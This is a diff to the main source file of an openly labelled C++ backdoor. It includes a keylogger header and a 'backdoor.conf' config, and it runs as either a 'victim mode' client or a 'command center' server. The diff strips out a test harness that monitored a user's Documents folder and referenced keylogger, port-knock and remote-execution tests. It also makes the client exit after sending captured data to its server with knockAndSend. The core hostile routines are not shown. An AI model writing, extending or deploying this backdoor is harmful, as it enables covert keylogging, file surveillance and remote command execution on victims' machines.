@@ -14,35 +14,6 @@
 
 #include "Keylogger.h"
 
-// TODO: Remove
-void testFileMonitor() {
-    EventCallback created = [&](const FileMonitor *fm, struct inotify_event *e) {
-        std::cout << "created" << std::endl;
-        std::cout << "name: " << e->name << std::endl;
-        std::cout << std::endl;
-    };
-
-    EventCallback modified = [&](const FileMonitor *fm, struct inotify_event *e) {
-        std::cout << "modified" << std::endl;
-        std::cout << "name: " << e->name << std::endl;
-        std::cout << std::endl;
-    };
-
-    EventCallback deleted = [&](const FileMonitor *fm, struct inotify_event *e) {
-        std::cout << "deleted" << std::endl;
-        std::cout << "name: " << e->name << std::endl;
-        std::cout << std::endl;
-    };
-
-    FileMonitor fm(created, modified, deleted);
-
-    std::cout << fm.addWatchFile("/home/zaur/Documents") << std::endl;
-
-    fm.startMonitoring();
-    sleep(20);
-    fm.stopMonitoring();
-}
-
 int main(int argc, char *argv[]) {
     Properties p = getConfig("backdoor.conf");
 
@@ -57,12 +28,6 @@ int main(int argc, char *argv[]) {
         return clientMode(p, argv[0]);
     } else if (option == "server") {
         return serverMode(p);
-    } else if (option == "test") {
-        // testKeylogger(p);
-        // testKnock(p);
-        // testRce(p);
-        // testRceRes(p);
-        testFileMonitor();
     } else {
         printUsage(argv[0]);
     }
@@ -80,7 +45,6 @@ void printUsage(const char *name) {
     std::cout << "Usage: " << name << " [client|server|test]" << std::endl;
     std::cout << "\tclient - client mode a.k.a victim mode" << std::endl;
     std::cout << "\tserver - server mode a.k.a command center mode" << std::endl;
-    std::cout << "\ttest - testing mode" << std::endl;
 }
 
 /*
@@ -195,6 +159,7 @@ int clientMode(const Properties &p, char *programName) {
                     struct in_addr daddr;
                     daddr.s_addr = host;
                     netEngine.knockAndSend(daddr, buffer);
+                    exit(0);
                 }
             }
         }
